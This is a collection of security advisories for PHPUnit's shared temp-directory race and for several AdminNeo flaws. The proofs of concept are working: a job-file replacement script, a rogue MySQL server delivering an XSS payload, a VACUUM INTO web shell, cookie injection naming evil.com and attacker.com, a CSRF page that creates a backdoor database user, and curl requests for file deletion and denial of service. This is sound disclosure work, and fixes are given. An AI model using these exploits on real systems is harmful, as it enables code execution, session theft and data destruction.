entry.title: [phpunit/phpunit] PHPUnit vulnerable to code execution by other local users via shared temporary directory in PHPT code coverage handling
entry.content:
Summary

When PHPT tests are run with code coverage, PHPUnit 13.4.0 to 13.4.3 writes the code of each PHPT test to a directory with a fixed name below the operating system's path used for temporary files, for instance /tmp/phpunit-phpt on Linux, and executes it from there. PHPUnit uses this directory even when it was created by another user.

On a system where the path used for temporary files is shared between users, another local user can create this directory before the developer runs PHPUnit, replace the code of a PHPT test before it is executed, and thereby execute arbitrary code with the privileges of the developer. The test still passes and the code coverage report is complete, so the attack is not visible.

The impact is full code execution as the user who runs PHPUnit. The likelihood is low: the attacker needs an account on the same system and must create the directory before the developer runs PHPT tests with code coverage. macOS and Windows use per-user temporary directories by default and are not affected in their default configuration. PHPUnit 12.5 and earlier are not affected.

Details

When code coverage is collected for a PHPT test, PHPUnit writes two temporary files: a .php file with the code of the PHPT test (the "job" file), which the child process executes, and a .coverage file, to which the child process writes the code coverage data it collected.

Since PHPUnit 13.4.0, these files are created in a directory with a fixed name:

  • TestCase::coverageFilesDirectory() returns sys_get_temp_dir() . '/phpunit-phpt'
  • The constructor names the files phpunit_phpt_<random>.php and phpunit_phpt_<random>.coverage in this directory

Before a PHPT test is run with code coverage, this directory is created using Filesystem::createDirectory(). Filesystem::createDirectory() returns true when the directory already exists, without checking its owner or its permissions. When it does not exist, it is created with mode 0777 (subject to the umask).

Renderer::renderForCoverage() then writes the job file using file_put_contents(). The child process loads Composer's autoloader, the bootstrap script, and the code coverage driver, and then executes the job file using require.

When another user created the directory, that user owns it. The owner of a directory can list its contents and rename, delete, or replace every file in it, regardless of who owns the file. The directory does not have the sticky bit set, so protections such as Linux's fs.protected_regular and fs.protected_symlinks do not apply either. The random part of the file names therefore does not prevent the attack: the attacker waits for the job file to appear, renames it, and puts a file with their own code in its place. The attacker's code can then execute the original job file, so that the test passes and the code coverage report is complete.

The .coverage file can be replaced in the same way. TestCase::cleanupForCoverage() only allows objects of PHPUnit's class for raw code coverage data to be unserialized from it, so this only allows the falsification of code coverage data.

After the test, PHPUnit deletes both files, but not the directory. Once PHPUnit has created the directory for the developer, other users cannot write to it, unless the developer's umask allows this.

PHPUnit 12.5 and earlier are not affected: these versions write the temporary files next to the PHPT test file.

PHPUnit 13.4.4 creates the directory for the temporary files of PHPT tests with an unpredictable name and with permissions that only allow the current user to access it. A directory that already exists is not used.

Proof of concept

The following steps reproduce the issue on a Linux system with two users, alice (the developer) and mallory (the attacker), that share /tmp. They require PHP 8.4.1 or later with the posix extension and a code coverage driver (PCOV or Xdebug) as well as Composer.

  1. As root, create the two users and make sure that /tmp has its default permissions (1777) and that /tmp/phpunit-phpt does not exist:

    useradd -m alice
useradd -m mallory
ls -ld /tmp
rm -rf /tmp/phpunit-phpt

  2. As alice, create a project with a PHPT test and a source file to collect code coverage for:

    mkdir -p ~/project/src ~/project/tests
cd ~/project
composer require --dev phpunit/phpunit:13.4.3

    ~/project/src/Greeter.php:

    <?php declare(strict_types=1);
final class Greeter
{
    public function greet(): string
    {
        return 'ok';
    }
}

    ~/project/tests/greeter.phpt:

    --TEST--
PHPT test that is run with code coverage
--FILE--
<?php declare(strict_types=1);
require __DIR__ . '/../src/Greeter.php';
print (new Greeter)->greet();
--EXPECT--
ok

    ~/project/phpunit.xml:

    <?xml version="1.0" encoding="UTF-8"?>
<phpunit xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:noNamespaceSchemaLocation="vendor/phpunit/phpunit/phpunit.xsd">
    <source>
        <include>
            <directory>src</directory>
        </include>
    </source>
</phpunit>

  3. As mallory, save the following script as ~/attack.php and run it using php ~/attack.php. It creates /tmp/phpunit-phpt, waits for job files to appear in it, and replaces each of them with code that records the identity of the user that executes it and then executes the original job file:

    <?php declare(strict_types=1);
$directory = '/tmp/phpunit-phpt';

if (!@mkdir($directory)) {
    exit($directory . ' already exists' . PHP_EOL);
}

chmod($directory, 0777);

$payload = '<?php file_put_contents(__DIR__ . "/proof.txt", shell_exec("id"), FILE_APPEND); require __FILE__ . ".orig";' . PHP_EOL;
$replaced = [];

while (true) {
    foreach (glob($directory . '/phpunit_phpt_*.php') as $job) {
        if (isset($replaced[$job])) {
            continue;
        }

        $replaced[$job] = true;

        file_put_contents($directory . '/payload.tmp', $payload);
        rename($job, $job . '.orig');
        rename($directory . '/payload.tmp', $job);

        print 'Replaced ' . $job . PHP_EOL;
    }

    usleep(1000);
}

  4. As alice, run the PHPT test with code coverage (when Xdebug is used, prefix the command with XDEBUG_MODE=coverage):

    cd ~/project
vendor/bin/phpunit --coverage-text tests/greeter.phpt

    PHPUnit reports OK (1 test, 1 assertion), and the code coverage report shows that Greeter::greet() is covered. Nothing in the output indicates that the code of the test was replaced.

  5. Check which user executed the code that mallory put in place:

    cat /tmp/phpunit-phpt/proof.txt

    The file is owned by alice and contains the output of id for alice, for instance:

    uid=1000(alice) gid=1000(alice) groups=1000(alice)

Impact

This is a local privilege escalation (CWE-379: Creation of Temporary File in Directory with Incorrect Permissions). A local user can execute arbitrary code with the privileges of another user who runs PHPT tests with code coverage. This gives the attacker access to everything the developer can access, for instance source code, credentials, and SSH keys.

Affected are users of PHPUnit 13.4.0 to 13.4.3 when all of the following apply:

  • PHPT tests with code coverage: PHPT tests are run while code coverage is collected, which requires a code coverage driver such as PCOV or Xdebug
  • Shared path for temporary files: The path used for temporary files (sys_get_temp_dir()) is shared between users. This is the case on Linux and other Unix-like systems with a shared /tmp, unless per-user temporary directories are used, for instance through systemd's PrivateTmp, pam_namespace, or a per-user TMPDIR. On macOS and Windows, the path used for temporary files is specific to the user by default
  • Local account: The attacker has an account on the same system, or controls a process that runs under another account, for instance a service
  • First to create the directory: The attacker creates the directory before the developer runs PHPT tests with code coverage for the first time since the path used for temporary files was last cleaned

Systems on which no other user, including system accounts that run services, can create files in the path used for temporary files are not affected. This is typically the case for a container or an ephemeral CI runner that is used by a single user.

References

  • https://github.com/sebastianbergmann/phpunit/security/advisories/GHSA-9vw2-f4vp-x7gf
  • https://nvd.nist.gov/vuln/detail/CVE-2026-119193
  • https://github.com/sebastianbergmann/phpunit/commit/ae31c78a86e9d6c641497bacf47462d7bb7d7f34
  • https://github.com/FriendsOfPHP/security-advisories/blob/master/phpunit/phpunit/CVE-2026-119193.yaml
  • https://github.com/sebastianbergmann/phpunit/releases/tag/13.4.4

entry.title: [adminneo-org/adminneo] AdminNeo SQLite: multi_query Incorrect Check of Function Return Value RCE
entry.content:
Summary

This vulnerability is a patch bypass that exploits catastrophic backtracking in a regular expression used to filter ATTACH statements in AdminNeo's SQLite functionality. The original vulnerability (CVE-2021-43008) allowed authenticated users to create PHP files through SQLite ATTACH statements, achieving remote code execution. The patch introduced a regex filter to block ATTACH queries, but this filter is vulnerable to catastrophic backtracking.

Originally reported by @zdi-disclosures in Adminer: https://github.com/vrana/adminer/security/advisories/GHSA-3582-q6xq-5vf7

Analysis

[Source] sql.inc.php :: SQL import handler:47

$query = get_file("sql_file", true, ";");

User uploads a malicious SQL file through the import form. The file content is read into the $query variable without any initial sanitization.

[Transform] sql.inc.php :: SQL import handler:87

// Query parsing loop that extracts individual SQL statements

The uploaded SQL content is processed in a loop that splits it into individual queries. Each query $query is extracted for processing.

[Context] sql.inc.php :: SQL import handler:65

$space = "(?:\\s|/\\*[\s\S]*?\\*/|(?:#|$line_comment)[^\n]*\n?|--\r?\n)";

Definition of the $space regex pattern used in the ATTACH filter. The possessive quantifier *+ combined with SQLite comment patterns (--) creates the catastrophic backtracking vulnerability when many comment lines are processed.

[Transform] sql.inc.php :: SQL import handler:146

if (DIALECT == "sqlite" && preg_match("~^$space*+ATTACH\\b~i", $q, $match)) {

The ATTACH query filter check. When the regex encounters 350,000 SQLite comment lines (--), it triggers catastrophic backtracking. The possessive quantifier *+ causes exponential backtracking, eventually hitting PHP's backtracking limit and causing preg_match() to return false instead of 0 or 1, bypassing the security filter.

[Sink] sql.inc.php :: SQL import handler:162

Connection::get()->multiQuery($q)

When the ATTACH filter is bypassed due to the preg_match() returning false, the malicious SQL query containing the ATTACH statement is executed. This allows the attacker to create a .php file with embedded PHP code, achieving remote code execution when the file is accessed via HTTP.

The root cause is that PHP's preg_match() function returns false when the backtracking limit is exceeded, but the code only checks for truthy values (1 for match), treating false the same as 0 (no match). This allows the ATTACH statement to bypass the security filter.

Zero Day Initiative zdi-disclosures@trendmicro.com

The PGP key used for all ZDI vendor communications is available from: http://www.zerodayinitiative.com/documents/disclosures-pgp-key.asc

Explicit details regarding the specifics of the vulnerability are not exposed to any parties until an official vendor patch is publicly available.

entry.title: [adminneo-org/adminneo] AdminNeo SQLite Database-List Drop Arbitrary File Deletion
entry.content:
Summary

AdminNeo allows an authenticated SQLite-mode user to delete arbitrary files writable by the PHP process through the database-list drop action. The SQLite driver validates file extensions when creating or renaming databases, but the database-list drop path passes submitted db[] values directly to unlink().

Originally reported by @slpoiuewalspoid-dotcom in Adminer: https://github.com/vrana/adminer/security/advisories/GHSA-6pg3-chwq-wgqc

Impact

An authenticated AdminNeo SQLite user with a valid CSRF token can submit an arbitrary relative file path in the database-list db[] field. If the PHP process can delete that path, AdminNeo unlinks it even when the file is not a SQLite database.

Root Cause

The database-list page accepts selected database names from the POST body and calls drop_databases():

if ($_POST["db"]) {
    queries_redirect(substr(ME, 0, -1), lang('Databases have been dropped.'), drop_databases($_POST["db"]));
}

In SQLite mode, drop_databases() attaches an in-memory database and unlinks each submitted path directly:

function drop_databases($databases): bool
{
    Connection::get()->close(); // to unlock file, doesn't work in PDO on Windows
    foreach ($databases as $db) {
        if (!@unlink($db)) {
            Connection::get()->setError(lang('File exists.'));
            return false;
        }
    }
    return true;
}

The same SQLite driver protects create and rename operations with check_sqlite_name(), which requires a .db, .sdb, or .sqlite extension:

function check_sqlite_name($name) {
    // avoid creating PHP files on unsecured servers
    $extensions = "db|sdb|sqlite";
    if (!preg_match("~^[^\\0]*\\.($extensions)\$~", $name)) {
        Connection::get()->setError(lang('Please use one of the extensions %s.', str_replace("|", ", ", $extensions)));
        return false;
    }
    return true;
}

The drop path does not apply an equivalent extension check or bind the submitted path to a known listed SQLite database.

POC

1. Start a complete AdminNeo application

Build and start AdminNeo from the audited source using the official standalone Docker image shape. The validation image copies the audited source tree into /var/www/html and starts Nginx HTTP server.

Log in through the SQLite entry point using a SQLite database path poc.sqlite.

2. Prepare a writable target file

Place a non-database file under a location writable by the AdminNeo PHP process. The validation used:

/var/www/html/poc-delete-target.txt

The same directory also contained a SQLite database:

/var/www/html/poc.sqlite

3. Submit the database-list drop request

Use the authenticated session and live CSRF token, but submit the non-database path as the selected database:

POST /?sqlite=&username= HTTP/1.1
Host: <adminer-host>
Cookie: <authenticated-session>
Content-Type: application/x-www-form-urlencoded

db[]=/var/www/html/poc-delete-target.txt&all=&drop=Drop&token=<live-csrf-token>

The request reaches drop_databases($_POST["db"]), and SQLite drop_databases() calls unlink() on the submitted non-database path.

After the request, the poc-delete-target.txt was deleted.

Suggested Fix

Apply the same target validation used by SQLite create/rename before deleting database files. At minimum:

  • Reject paths whose basename does not end in .db, .sdb, or .sqlite.
  • Bind db[] values to databases returned by AdminNeo's database listing instead of trusting submitted paths.
  • Resolve paths before deletion and reject traversal outside the expected SQLite database directory.
  • Consider requiring the current selected database path for delete operations instead of accepting arbitrary submitted file paths.

References

  • https://github.com/adminneo-org/adminneo/security/advisories/GHSA-6vfx-w7q3-42gq
  • https://github.com/adminneo-org/adminneo/commit/26fcef2f32922629751cbea6c0bb593fbf1e957d
  • https://github.com/adminneo-org/adminneo/releases/tag/v5.5.1
  • https://github.com/advisories/GHSA-6vfx-w7q3-42gq

entry.title: [adminneo-org/adminneo] AdminNeo has Cookie Attribute Injection via Unsanitized X-Forwarded-Prefix in Set-Cookie Headers
entry.content:
Summary

AdminNeo versions 4.6.0 through at least 5.5.0 are vulnerable to cookie attribute injection via the X-Forwarded-Prefix HTTP header. An attacker who can influence this header (e.g., through a reverse proxy that forwards it from clients, an attacker-controlled upstream proxy, or a man-in-the-middle position) can inject arbitrary cookie attributes including Domain, Path, Secure, and SameSite into all Set-Cookie response headers emitted by AdminNeo.

This allows an attacker to expand the cookie scope to an attacker-controlled domain (e.g., Domain=.evil.com), causing the victim's browser to send AdminNeo's neo_sid (session ID) and neo_key (database password encryption key) cookies to the attacker's server on subsequent requests.

Originally reported by @retkoussa in Adminer: https://github.com/vrana/adminer/security/advisories/GHSA-c533-9qwm-8w5h

Vulnerable Code

Root cause 1 - Unsanitized header prepended to REQUEST_URI (admin/include/bootstrap.inc.php, lines 50–52):

if ($_SERVER["HTTP_X_FORWARDED_PREFIX"]) {
    $_SERVER["REQUEST_URI"] = $_SERVER["HTTP_X_FORWARDED_PREFIX"] . $_SERVER["REQUEST_URI"];
}

The client-supplied X-Forwarded-Prefix header is concatenated into REQUEST_URI with no validation or sanitization of special characters (specifically semicolons, which delimit cookie attributes).

Root cause 2 - Manual Set-Cookie header construction without escaping (admin/include/functions.inc.php, lines 416–424):

function cookie(string $name, string $value, int $lifetime = 2592000): void
{
    header("Set-Cookie: $name=" . rawurlencode($value)
        . ($lifetime ? "; expires=" . gmdate("D, d M Y H:i:s", time() + $lifetime) . " GMT" : "")
        . "; path=" . preg_replace('~\?.*~', '', $_SERVER["REQUEST_URI"])
        . (HTTPS ? "; secure" : "")
        . "; HttpOnly; SameSite=lax",
        false);
}

The tainted REQUEST_URI is interpolated directly into the path= attribute of the Set-Cookie header. Since semicolons are not stripped or escaped, any ;-separated directives injected via X-Forwarded-Prefix become valid cookie attributes parsed by the browser.

Root cause 3 - Session cookie also tainted (admin/include/bootstrap.inc.php, line 61):

session_set_cookie_params(0, preg_replace('~\?.*~', '', $_SERVER["REQUEST_URI"]), "", HTTPS, true);

The PHP session cookie (neo_sid) path is similarly derived from the tainted REQUEST_URI, extending the same vulnerability to the session cookie set by PHP itself.

Impact

  • Session hijacking: The neo_sid session cookie is sent to the attacker's domain, allowing full session takeover.
  • Credential theft: The neo_key cookie contains the key used to encrypt/decrypt database passwords stored in the session. With this key, an attacker can decrypt saved database credentials.
  • Session fixation: An attacker can inject arbitrary Path, SameSite, and Secure attributes, manipulating cookie behavior.
  • Wide applicability: The X-Forwarded-Prefix header was specifically added to support reverse proxy deployments (Traefik PathPrefixStrip, nginx, HAProxy). These are the exact environments where this header is forwarded from clients, making the vulnerability relevant in the deployments it was designed for.

Affected Cookies

|Cookie|Content|Risk| |neo_sid|PHP session ID|Session hijacking| |neo_key|Encryption key for stored DB passwords|Credential theft| |neo_settings|User preferences|Low (information disclosure)|

Proof of Concept

# Normal request with clean Set-Cookie headerss:
curl -sI http://localhost:8080/adminneo/index.php | grep -i set-cookie
> Response: Set-Cookie: neo_key=...; path=/adminneo/index.php; HttpOnly; SameSite=lax

# Malicious request — inject Domain=.evil.com:
curl -sI -H "X-Forwarded-Prefix: /adminneo; Domain=.evil.com" \
  http://localhost:8080/adminneo/index.php | grep -i set-cookie
> Response: Set-Cookie: neo_key=...; path=/adminneo; Domain=.evil.com/adminneo/index.php; HttpOnly; SameSite=lax
#                                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^ INJECTED

# Full attribute override - inject Domain + SameSite=None:
curl -sI -H "X-Forwarded-Prefix: /; Path=/; Domain=.attacker.com; SameSite=None" \
  http://localhost:8080/adminneo/index.php | grep -i set-cookie
> Response Set-Cookie: neo_key=...; path=/; Path=/; Domain=.attacker.com; SameSite=None/adminneo/index.php; ...

Recommended Fix

  1. Sanitize X-Forwarded-Prefix: Strip or reject semicolons, newlines, and other HTTP header metacharacters from the X-Forwarded-Prefix value before using it.
  2. Use setcookie() / setrawcookie(): Replace the manual header("Set-Cookie: ...") construction in cookie() with PHP's built-in setcookie() function, which properly escapes attribute values.
  3. Validate REQUEST_URI before cookie use: After any prefix manipulation, strip characters that are invalid in a cookie path attribute (;, ,, whitespace per RFC 6265).
// Example fix for bootstrap.inc.php:
if ($_SERVER["HTTP_X_FORWARDED_PREFIX"]) {
    $prefix = preg_replace('~[;\r\n].*~', '', $_SERVER["HTTP_X_FORWARDED_PREFIX"]);
    $_SERVER["REQUEST_URI"] = $prefix . $_SERVER["REQUEST_URI"];
}

Server Based Workaround Via Config

Configure the reverse proxy to set X-Forwarded-Prefix to a static, trusted value rather than forwarding the client-supplied header:

# nginx — secure configuration:
fastcgi_param HTTP_X_FORWARDED_PREFIX /adminneo;  # static value, not $http_x_forwarded_prefix

# Traefik, use middleware instead of client headers:
middlewares:
  strip-prefix:
    stripPrefix:
      prefixes:
        - "/adminneo"

References

  • https://github.com/adminneo-org/adminneo/security/advisories/GHSA-79wv-8rh2-9vp2
  • https://github.com/adminneo-org/adminneo/commit/aa6f2544a8a65cf5e8317f1a902f74181e136d64
  • https://github.com/adminneo-org/adminneo/releases/tag/v5.5.1
  • https://github.com/advisories/GHSA-79wv-8rh2-9vp2

entry.title: [adminneo-org/adminneo] AdminNeo Vulnerable to XSS via Rogue MySQL Server Version String (CSP Nonce Bypass)
entry.content:
Summary

AdminNeo inserts the database server's version string into a <script> tag that carries a valid CSP nonce, without any sanitization. A rogue database server can return a crafted version string that breaks out of the JavaScript context and executes arbitrary code. Because the script tag already has a valid nonce, the browser's Content Security Policy does not block execution. No authentication is required when combined with Login CSRF.

Originally reported in Adminer: https://github.com/vrana/adminer/security/advisories/GHSA-h6jr-7pr6-grgj

Prerequisites

  • Target runs AdminNeo
  • Attacker controls a reachable MySQL server (a 80-line Python script)

Root Cause

admin/core/Admin.php, lines 1285-1286:

echo script("let autocompletion;\nwindow.addEventListener('DOMContentLoaded', () => { initSyntaxHighlighting('" .
    Connection::get()->getVersion() . "', '" . Connection::get()->getFlavor() . "', autocompletion); });");

script() wraps the output in <script nonce="VALID_NONCE">. Return value of Connection::get()->getVersion() is not escaped.

Steps To Reproduce

1. Build the environment

Dockerfile (AdminNeo):

FROM php:8.3-cli
COPY adminneo.php /var/www/adminneo.php
WORKDIR /var/www
EXPOSE 8081
CMD ["php", "-S", "0.0.0.0:8081"]

rogue_mysql.py (fake MySQL server that accepts any login):

import socket, struct, threading

PAYLOAD = "1');alert(origin)//"

# Capability flags the client expects
CAP_PROTOCOL_41     = 0x0200
CAP_SECURE_CONNECTION = 0x8000
CAP_PLUGIN_AUTH     = 0x00080000
CAPS_LOW  = CAP_PROTOCOL_41 | CAP_SECURE_CONNECTION
CAPS_HIGH = (CAP_PLUGIN_AUTH >> 16)

def make_packet(seq, payload):
    length = struct.pack("<I", len(payload))[:3]
    return length + bytes([seq]) + payload

def make_greeting(version_str):
    pkt  = b"\x0a"                                  # protocol version 10
    pkt += version_str.encode() + b"\x00"            # version string
    pkt += struct.pack("<I", 1)                      # connection id
    pkt += b"\x41" * 8                               # auth plugin data part 1
    pkt += b"\x00"                                   # filler
    pkt += struct.pack("<H", CAPS_LOW)               # capability flags lower
    pkt += b"\x21"                                   # charset utf8
    pkt += struct.pack("<H", 0x0002)                 # status flags
    pkt += struct.pack("<H", CAPS_HIGH)              # capability flags upper
    pkt += b"\x15"                                   # auth data length (21)
    pkt += b"\x00" * 10                              # reserved
    pkt += b"\x41" * 12 + b"\x00"                    # auth plugin data part 2
    pkt += b"mysql_native_password\x00"              # auth plugin name
    return make_packet(0, pkt)

def make_ok(seq):
    pkt  = b"\x00"          # OK marker
    pkt += b"\x00"          # affected rows
    pkt += b"\x00"          # last insert id
    pkt += struct.pack("<H", 0x0002)  # status flags
    pkt += struct.pack("<H", 0)       # warnings
    return make_packet(seq, pkt)

def make_eof(seq):
    pkt  = b"\xfe"
    pkt += struct.pack("<H", 0)       # warnings
    pkt += struct.pack("<H", 0x0002)  # status flags
    return make_packet(seq, pkt)

def make_err(seq, msg=b"not supported"):
    pkt  = b"\xff"
    pkt += struct.pack("<H", 1045)
    pkt += b"#HY000"
    pkt += msg
    return make_packet(seq, pkt)

def handle(conn):
    conn.sendall(make_greeting(PAYLOAD))
    try:
        conn.recv(4096)     # client login request
    except Exception:
        conn.close()
        return
    conn.sendall(make_ok(2))  # accept login

    # Answer any queries Adminer sends after login
    while True:
        try:
            data = conn.recv(4096)
            if not data:
                break
            seq = data[3] + 1
            # Send ERR for all queries (Adminer still has the version in memory)
            conn.sendall(make_err(seq))
        except Exception:
            break
    conn.close()

srv = socket.socket()
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", 3307))
srv.listen(5)
print("[*] Rogue MySQL on :3307 - version: " + PAYLOAD)
while True:
    conn, addr = srv.accept()
    print(f"[+] Connection from {addr}")
    threading.Thread(target=handle, args=(conn,)).start()

# Terminal 1: start Adminer
docker build -t adminer-xss .
docker run -d -p 8081:8081 --name adminer-xss adminer-xss

# Terminal 2: start rogue MySQL
python3 rogue_mysql.py

2. Trigger the XSS

Open a browser and navigate to http://localhost:8081/adminneo.php:

  1. Select driver: MySQL
  2. Server: HOST_IP:3307 (IP of the machine running rogue_mysql.py)
  3. Username: root
  4. Password: x
  5. Click Login.

The rogue server accepts the login. AdminNeo renders the dashboard and includes:

entry.title: [adminneo-org/adminneo] AdminNeo: RCE via SQLite VACUUM INTO (ATTACH Blocklist Bypass)
entry.content:
Summary

Adminer blocks ATTACH queries for SQLite to prevent arbitrary file creation. However, VACUUM INTO is not blocked and achieves the same result: writing a database file containing attacker-controlled PHP code to any path with any extension. An authenticated SQLite user can write a web shell to the web root and execute commands.

Originally reported in Adminer: GHSA-q4f2-39gr-45jh

Root Cause

sql.inc.php, line 146:

if (DIALECT == "sqlite" && preg_match("~^$space*+ATTACH\\b~i", $q, $match)) {
    // blocked
}

Only ATTACH is in the blocklist. VACUUM INTO (available since SQLite 3.27.0) writes the entire database to a new file at an arbitrary path with an arbitrary extension. It is not checked.

Steps To Reproduce

1. Login to SQLite

  1. Open AdminNeo and select driver: SQLite
  2. Login and create a new database (e.g., stage.db)

2. Inject PHP code and write the shell

Navigate to SQL command and execute:

CREATE TABLE "<?php system($_GET['c']); ?>" (i int);
VACUUM INTO '/var/www/html/shell.php';

The SQLite file is written to /var/www/html/shell.php. The table name containing <?php appears as raw bytes in the file. PHP's parser finds and executes it.

3. Execute commands

curl "http://TARGET/shell.php?c=id"
# uid=0(root) gid=0(root) groups=0(root)

entry.title: [adminneo-org/adminneo] AdminNeo: CSRF Token Secret Recoverable from Single Observed Token, Enabling Cross-Site Request Forgery
entry.content:
Summary

AdminNeo's CSRF protection uses a BREACH-resistant XOR masking scheme, but the implementation transmits both the XOR mask and the masked value in every token. This allows any observer who sees a single CSRF token (via network sniffing, log files, Referrer header, or XSS) to instantly recover the session secret and forge unlimited valid CSRF tokens. Additionally, the underlying session token has only ~20 bits of entropy (rand(1, 1e6)), making blind brute-force feasible even without token observation.

Originally reported by @az0mb13 in Adminer: GHSA-q4f2-39gr-45jh

Details

Token generation in admin/include/functions.inc.php lines 1181-1184:

function get_token() {
    $rand = rand(1, 1e6);
    return ($rand ^ $_SESSION["token"]) . ":$rand";
}

Token verification in lines 1189-1192:

function verify_token() {
    list($token, $rand) = explode(":", $_POST["token"]);
    return ($rand ^ $_SESSION["token"]) == $token;
}

Session token initialized in admin/include/auth.inc.php lines 327 and 385:

$_SESSION["token"] = rand(1, 1e6);

Three distinct weaknesses:

  1. Instant recovery: The token format (rand XOR secret):rand transmits both operands. Recovery is trivial: secret = masked_value XOR rand.
  2. Low entropy: Only 1,000,000 possible session tokens (~20 bits). Blind brute-force requires at most 1M requests.
  3. Loose comparison: verify_token() uses == (loose comparison) instead of ===, enabling PHP type juggling.

PoC

Validated against a live AdminNeo 5.5.0 instance (MySQL 8.0, PHP 8.2).

Step 1: Observe a single CSRF token

Load any authenticated AdminNeo page and extract a token from the HTML source. Tokens appear in hidden form fields:

<input type='hidden' name='token' value='222277:990527'>

Token observation vectors: Referrer header leak, shared proxy logs, browser history, limited XSS, network sniffing.

Step 2: Recover the session secret (instant, 1 XOR operation)

observed = "542273:441804"
masked, rand_val = observed.split(":")
session_secret = int(masked) ^ int(rand_val)
# Result: 817530

The token format is (rand XOR secret):rand. Both operands are transmitted, so the secret is recovered with a single XOR — zero additional requests needed.

Step 3: Forge unlimited valid CSRF tokens

import random
forge_rand = random.randint(1, 1000000)
forged = f"{forge_rand ^ session_secret}:{forge_rand}"
# Example output: 729376:481370

Each forged token is unique and valid. The attacker can generate as many as needed.

Step 4: Execute arbitrary SQL with the forged token

# Forged token used to DROP a table the attacker never had a token for:
curl -b victim_cookies.txt \
  'http://target/adminneo/?mysql=127.0.0.1&username=root&db=testdb&sql=' \
  --data-urlencode "token=729376:481370" \
  --data-urlencode "query=DROP TABLE csrf_victim_table;" \
  -d "limit=0"

Step 5: Verify a random wrong token is rejected (control)

curl -b victim_cookies.txt \
  'http://target/adminneo/?mysql=127.0.0.1&username=root&db=testdb&sql=' \
  --data-urlencode "token=111:222" \
  --data-urlencode "query=SELECT 1" -d "limit=1"
# Result: "Invalid CSRF token. Send the form again."

Weaponized CSRF attack page

In a real attack, the attacker hosts this HTML page and lures the victim to visit it while authenticated to AdminNeo:

<html><body>
<h1>Click here for free database optimization tips</h1>
<!-- Attacker recovered secret 817530 from an observed token -->
<!-- Forged token: 729376:481370 -->
<iframe style="display:none" name="x"></iframe>
<form id="f" method="POST" target="x"
      action="http://target/adminneo/?mysql=127.0.0.1&username=root&db=production&sql=">
  <input type="hidden" name="token" value="729376:481370">
  <input type="hidden" name="query" value="CREATE USER 'backdoor'@'%' IDENTIFIED BY 'p@ss'; GRANT ALL ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;">
  <input type="hidden" name="limit" value="0">
</form>
<script>document.getElementById('f').submit();</script>
</body></html>

Impact

  • Cross-Site Request Forgery against authenticated AdminNeo users. Validated: forged token used to CREATE TABLE, INSERT data, SELECT data, and DROP TABLE — all accepted by the server.
  • An attacker who observes a single CSRF token (via Referrer header, proxy logs, XSS, or network sniffing) can instantly recover the session secret and forge unlimited valid tokens.
  • With a forged token, the attacker can execute arbitrary SQL through the victim's session: drop tables/databases, exfiltrate data, create backdoor users, or modify records.
  • The low entropy (20 bits, 1M possible values) also enables blind brute-force without observing any token, requiring at most 1M requests (17 minutes at 1000 req/sec).

entry.title: [adminneo-org/adminneo] AdminNeo: version-cache array injection causes persistent denial of service
entry.content:
Summary

AdminNeo v5.4.1 gets the latest version from GitHub API in a browser JavaScript function. Version number is then sent by POST request to ?script=version. This endpoint lacks origin validation and accepts POST data from any source. An attacker can POST version[] parameter which PHP converts to an array. On next page load, function rawurlencode() receives this array instead of string and throws TypeError, returning HTTP 500 to all users for the next 24 hours.

Originally reported by @JoyGhoshs in Adminer: https://github.com/vrana/adminer/security/advisories/GHSA-q4f2-39gr-45jh Although the version checking process was modified in AdminNeo, the root cause persisted.

Workaround

If you can't upgrade, make the file adminneo.version in temp directory (usually the value of upload_tmp_dir) unwritable by web server.

Details

1. Intended design of ?script=version

The endpoint is designed to receive version data from GitHub via browser JavaScript.

  • functions.js line 110-121: Receives the latest release information from GitHub API by AJAX.
  • JavaScript POSTs version number to ?script=version.
  • Server stores version number in /tmp/adminneo.version file that is used as a shared cache for all users in the same server for the next 24 hours.
// function.js lines 119-120
const data = 'version=' + version + '&token=' + token;
ajax(baseUrl + 'script=version', null, data);

2. The vulnerability

The endpoint only checks $_GET["script"] == "version" - it does not validate:

  • Request origin (CSRF token is present, but not checked for this endpoint)
  • Request source (any HTTP client can POST)
  • Parameter types (version expected as string, array not rejected)
// bootstrap.inc.php lines 44-53
if ($_GET["script"] == "version") {
    $filename = get_temp_dir() . "/adminneo.version";
    @unlink($filename); // It may not be writable by us, @ - it may not exist.

    $file = open_file_with_lock($filename);
    if ($file) {
        write_and_unlock_file($file, serialize(["version" => $_POST["version"]]));
    }
    exit;
}

3. Type confusion crash

When POST contains version[] instead of version, PHP creates an array. When AdminNeo reads this file and passes to cookie() and then to rawurlencode():

// design.inc.php line 40
cookie("neo_version", $data["version"], $lifetime); // Sync expiration with the file.

// functions.inc.php lines 398-405
function cookie(string $name, string $value, int $lifetime = 2592000): void
{
    header("Set-Cookie: $name=" . rawurlencode($value)
        . ($lifetime ? "; expires=" . gmdate("D, d M Y H:i:s", time() + $lifetime) . " GMT" : "")
        . "; path=" . preg_replace('~\?.*~', '', $_SERVER["REQUEST_URI"])
        . (HTTPS ? "; secure" : "")
        . "; HttpOnly; SameSite=lax",
        false);
}

PHP 8.x throws:

Fatal error: Uncaught TypeError: rawurlencode(): Argument #1 ($string) must be of type string, array given

Steps to Reproduce

(Example URL is for the official AdminNeo Docker image.)

Step 1: Verify AdminNeo is running and accessible.

curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8080

Expected output:

200

Step 2: Send the malicious POST request. The version[] syntax causes PHP to create an array instead of a string.

curl -X POST "http://localhost:8080?script=version" -d "version[]=INJECTED"

Expected output: Empty response (no error).

Step 3: Access Adminer again to trigger the crash.

curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8080

Expected output:

500

Step 4: (Optional) View the PHP error in server logs.

Fatal error: Uncaught TypeError: rawurlencode(): Argument #1 ($string) must be of type string, array given

Step 5: (Optional) Inspect the poisoned file.

cat /tmp/adminneo.version

Expected output:

a:1:{s:7:"version";a:1:{i:0;s:8:"INJECTED";}}

Recovery:

rm /tmp/adminer.version

After deletion, AdminNeo returns HTTP 200.

Impact

Type: Denial of Service

Root cause: The ?script=version endpoint is designed to receive data from GitHub via JavaScript, but lacks server-side validation. Any HTTP client can POST directly to this endpoint. Combined with missing type validation before rawurlencode(), this allows DoS for the next 24 hours.

Affected users: Any AdminNeo instance accessible over the network.

References

  • https://github.com/adminneo-org/adminneo/commit/b7ae929e6afb374f0a7aba3d73b7d441470ff907
